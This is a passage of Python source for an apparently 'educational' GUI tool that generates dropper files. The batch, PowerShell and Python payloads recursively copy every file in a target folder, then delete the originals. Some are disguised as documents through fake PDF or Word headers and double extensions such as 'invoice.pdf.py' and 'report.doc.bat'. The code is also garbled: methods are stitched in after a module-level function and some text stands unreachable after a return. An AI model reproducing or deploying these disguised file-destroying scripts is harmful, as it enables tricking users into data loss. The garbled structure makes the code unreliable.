set TARGET={self.test_dir}
set EXT=.pro_bat
echo [TARGET] %TARGET%
for /r "%TARGET%" %%f in (*) do (
    echo %%~nxf | findstr /i "notice" >nul
    if errorlevel 1 (
        echo %%~nxf | findstr /i "%EXT%" >nul
        if errorlevel 1 (
            copy "%%f" "%%f%EXT%" >nul 2>&1
            if exist "%%f%EXT%" del "%%f" >nul 2>&1
            echo [PROCESSED] %%~nxf
        )
    )
)
echo [COMPLETE] Professional batch execution finished
pause
'''
    
    def _generate_powershell_content(self):
        return f'''Write-Host "⚠️  PROFESSIONAL POWERSHELL DROPPER ACTIVATED ⚠️" -ForegroundColor Red
$TargetDir = "{self.test_dir}"
$Extension = ".pro_ps1"
Get-ChildItem -Path $TargetDir -Recurse -File | Where-Object {{
    $_.Name -notlike "*NOTICE*" -and $_.Extension -ne $Extension
}} | ForEach-Object {{
    $Content = "# PROFESSIONAL POWERSHELL DROPPER`n" + (Get-Content $_.FullName -Raw)
    Set-Content ($_.FullName + $Extension) $Content -Encoding UTF8
    Remove-Item $_.FullName -Force
    Write-Host "[PROCESSED] $($_.Name)" -ForegroundColor Green
}}
Write-Host "[COMPLETE] Professional PowerShell execution finished" -ForegroundColor Yellow
pause
'''
    
    def _generate_disguised_python_content(self):
        return f'''%PDF-1.4
%âãÏÓ
# This appears to be a PDF header but is actually Python code
import os, time, pathlib
def pdf_dropper():
    print("⚠️  DISGUISED PDF-PYTHON DROPPER ACTIVATED ⚠️")
    target = pathlib.Path(r"{self.test_dir}")
    if target.exists():
        count = 0
        for f in target.rglob("*"):
            if f.is_file() and not f.name.endswith(".pdf_py") and "NOTICE" not in f.name:
                try:
                    data = f.read_bytes()
                    new_name = str(f) + ".pdf_py"
                    with open(new_name, 'wb') as nf:
                        nf.write(b"# DISGUISED PDF-PYTHON DROPPER\\n")
                        nf.write(data)
                    f.unlink()
                    count += 1
                    print(f"[ENCRYPTED] {{f.name}}")
                except: pass
        print(f"[COMPLETE] Encrypted {{count}} files")
if __name__ == "__main__":
    pdf_dropper()
'''
    
    def _generate_disguised_batch_content(self):
        return f'''REM Microsoft Word Document Header Simulation
REM DOCFILEHEADER_BEGIN
@echo off
title Disguised Word-Batch Dropper
echo ⚠️  DISGUISED WORD-BATCH DROPPER ACTIVATED ⚠️
set TARGET={self.test_dir}
set EXT=.doc_bat
echo [TARGET] %TARGET%
for /r "%TARGET%" %%f in (*) do (
    echo %%~nxf | findstr /i "notice" >nul
    if errorlevel 1 (
        echo %%~nxf | findstr /i "%EXT%" >nul
        if errorlevel 1 (
            copy "%%f" "%%f%EXT%" >nul 2>&1
            if exist "%%f%EXT%" del "%%f" >nul 2>&1
            echo [PROCESSED] %%~nxf
        )
    )
)
echo [COMPLETE] Disguised batch execution finished
pause
'''
    
    def _generate_readme_content(self):
        return '''PROFESSIONAL DROPPER SUITE
=========================
⚠️  EDUCATIONAL SECURITY RESEARCH ONLY ⚠️
This package contains professional-grade dropper examples.
Educational Security Research Framework
'''
        """Exit the application."""
        if messagebox.askyesno("Exit", "Are you sure you want to exit?"):
            self.root.quit()
    
    def run(self):
        """Start the GUI application."""
        self.root.mainloop()

def main():
    """Main entry point."""
    # Check if running in GUI environment
    try:
        app = InteractiveFileSelector()
        app.run()
    except tk.TclError:
        print("GUI not available. Running in console mode...")
        # Fallback to console mode if GUI fails
        console_fallback()

def console_fallback():
    """Console-based fallback for file selection."""
    print("=" * 60)
    print("EDUCATIONAL FILE SELECTOR INJECTOR - CONSOLE MODE")
    print("=" * 60)
    
    selected_files = []
    
    while True:
        print("\nOptions:")
        print("1. Add files")
        print("2. Add directory")
        print("3. View selected files")
        print("4. Clear selection")
        print("5. Execute injection")
        print("6. Exit")
        
        choice = input("\nEnter choice (1-6): ").strip()
        
        if choice == "1":
            file_path = input("Enter file path: ").strip()
            if os.path.exists(file_path) and os.path.isfile(file_path):
                if file_path not in selected_files:
                    selected_files.append(file_path)
                    print(f"Added: {file_path}")
                else:
                    print("File already selected")
            else:
                print("Invalid file path")
                
        elif choice == "2":
            dir_path = input("Enter directory path: ").strip()
            if os.path.exists(dir_path) and os.path.isdir(dir_path):
                import glob
                files = glob.glob(os.path.join(dir_path, "*"))
                files = [f for f in files if os.path.isfile(f)]
                for file_path in files:
                    if file_path not in selected_files:
                        selected_files.append(file_path)
                print(f"Added {len(files)} files from directory")
            else:
                print("Invalid directory path")
                
        elif choice == "3":
            print(f"\nSelected files ({len(selected_files)}):")
            for i, file_path in enumerate(selected_files, 1):
                print(f"{i}. {file_path}")
                
        elif choice == "4":
            selected_files.clear()
            print("Selection cleared")
            
        elif choice == "5":
            if not selected_files:
                print("No files selected")
                continue
                
            print(f"\nExecuting injection on {len(selected_files)} files...")
            # Simple injection simulation
            for file_path in selected_files:
                try:
                    with open(file_path, 'a') as f:
                        f.write(f"\n# EDUCATIONAL INJECTION - {datetime.now()}\n")
                    print(f"Injected: {os.path.basename(file_path)}")
                except Exception as e:
                    print(f"Failed: {os.path.basename(file_path)} - {e}")
            print("Injection complete!")
            
        elif choice == "6":
            break
            
        else:
            print("Invalid choice")

    def _create_professional_archive(self):
        """Create professional multi-format archive dropper."""
        try:
            self.status_var.set("Creating professional archive dropper...")
            self.root.update()
            
            # Import the professional dropper framework
            sys.path.insert(0, str(Path(__file__).parent.parent))
            from clean_professional_dropper import ProfessionalMultiFormatDropper
            
            # Create professional dropper
            dropper = ProfessionalMultiFormatDropper(target_dir=str(self.test_dir))
            files = dropper.create_comprehensive_dropper_suite()
            
            if files:
                messagebox.showinfo("Success", 
                                  f"Created {len(files)} professional dropper files!\n\n"
                                  f"Files: {', '.join(files)}\n\n"
                                  f"These demonstrate real-world multi-format attack techniques.")
                self.status_var.set(f"Created {len(files)} professional droppers")
            else:
                messagebox.showwarning("Warning", "No professional dropper files were created.")
                self.status_var.set("Professional dropper creation failed")
                
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create professional archive: {e}")
            self.status_var.set("Professional archive creation failed")
    
    def _create_disguised_python(self):
        """Create Python dropper disguised as PDF."""
        try:
            self.status_var.set("Creating disguised Python dropper...")
            self.root.update()
            
            # Create disguised Python dropper
            dropper_content = f'''%PDF-1.4
%âãÏÓ
# This appears to be a PDF header but is actually Python code

import os, time, pathlib

def pdf_dropper():
    print("⚠️  DISGUISED PDF-PYTHON DROPPER ACTIVATED ⚠️")
    target = pathlib.Path(r"{self.test_dir}")
    if target.exists():
        count = 0
        for f in target.rglob("*"):
            if f.is_file() and not f.name.endswith(".pdf_py") and "NOTICE" not in f.name:
                try:
                    data = f.read_bytes()
                    new_name = str(f) + ".pdf_py"
                    with open(new_name, 'wb') as nf:
                        nf.write(b"# DISGUISED PDF-PYTHON DROPPER\\n")
                        nf.write(data)
                    f.unlink()
                    count += 1
                    print(f"[ENCRYPTED] {{f.name}}")
                except: pass
        
        notice = f"""DISGUISED PDF-PYTHON DROPPER SIMULATION
Processed {{count}} files in {self.test_dir}
Educational demonstration of file disguise techniques.
"""
        with open(target / "PDF_PYTHON_NOTICE.txt", 'w') as n:
            n.write(notice)
        print(f"[COMPLETE] Encrypted {{count}} files")

if __name__ == "__main__":
    pdf_dropper()
'''
            
            # Save the dropper
            dropper_path = self.test_dir.parent / "invoice.pdf.py"
            with open(dropper_path, 'w') as f:
                f.write(dropper_content)
            
            messagebox.showinfo("Success", 
                              f"Created disguised Python dropper:\n{dropper_path}\n\n"
                              f"When executed, this will encrypt files in:\n{self.test_dir}")
            self.status_var.set("Created disguised Python dropper")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create disguised Python dropper: {e}")
            self.status_var.set("Disguised Python creation failed")
    
    def _create_disguised_batch(self):
        """Create batch dropper disguised as Word document."""
        try:
            self.status_var.set("Creating disguised batch dropper...")
            self.root.update()
            
            # Create disguised batch dropper
            dropper_content = f'''REM Microsoft Word Document Header Simulation
REM DOCFILEHEADER_BEGIN

@echo off
title Disguised Word-Batch Dropper
echo ⚠️  DISGUISED WORD-BATCH DROPPER ACTIVATED ⚠️
set TARGET={self.test_dir}
set EXT=.doc_bat
echo [TARGET] %TARGET%
for /r "%TARGET%" %%f in (*) do (
    echo %%~nxf | findstr /i "notice" >nul
    if errorlevel 1 (
        echo %%~nxf | findstr /i "%EXT%" >nul
        if errorlevel 1 (
            copy "%%f" "%%f%EXT%" >nul 2>&1
            if exist "%%f%EXT%" del "%%f" >nul 2>&1
            echo [PROCESSED] %%~nxf
        )
    )
)
echo [COMPLETE] Disguised batch execution finished
pause
'''
            
            # Save the dropper
            dropper_path = self.test_dir.parent / "report.doc.bat"
            with open(dropper_path, 'w') as f:
                f.write(dropper_content)
            
            messagebox.showinfo("Success", 
                              f"Created disguised batch dropper:\n{dropper_path}\n\n"
                              f"When executed, this will encrypt files in:\n{self.test_dir}")
            self.status_var.set("Created disguised batch dropper")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create disguised batch dropper: {e}")
            self.status_var.set("Disguised batch creation failed")
    
    def _create_all_professional_droppers(self):
        """Create all professional dropper types."""
        try:
            self.status_var.set("Creating all professional droppers...")
            self.root.update()
            
            created_count = 0
            
            # Create each type of professional dropper
            methods = [
                self._create_professional_archive,
                self._create_disguised_python, 
                self._create_disguised_batch
            ]
            
            for method in methods:
                try:
                    # Store original messagebox functions temporarily
                    original_info = messagebox.showinfo
                    original_error = messagebox.showerror
                    original_warning = messagebox.showwarning
                    
                    # Suppress messages during bulk creation
                    messagebox.showinfo = lambda *args, **kwargs: None
                    messagebox.showerror = lambda *args, **kwargs: None
                    messagebox.showwarning = lambda *args, **kwargs: None
                    
                    method()
                    created_count += 1
                    
                    # Restore original functions
                    messagebox.showinfo = original_info
                    messagebox.showerror = original_error
                    messagebox.showwarning = original_warning
                    
                except Exception as e:
                    print(f"Failed to create {method.__name__}: {e}")
            
            if created_count > 0:
                messagebox.showinfo("Success", 
                                  f"Created {created_count} professional dropper types!\n\n"
                                  f"Includes archive, disguised Python, and disguised batch droppers.\n"
                                  f"All target the directory: {self.test_dir}")
                self.status_var.set(f"Created {created_count} professional dropper types")
            else:
                messagebox.showwarning("Warning", "No professional droppers were created.")
                self.status_var.set("No professional droppers created")
                
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create professional droppers: {e}")
            self.status_var.set("Professional dropper creation failed")

    
    def _exit_application(self):
        """Exit the application."""
        if messagebox.askyesno("Confirm Exit", "Are you sure you want to exit?"):
            self.root.quit()

if __name__ == "__main__":
    main()
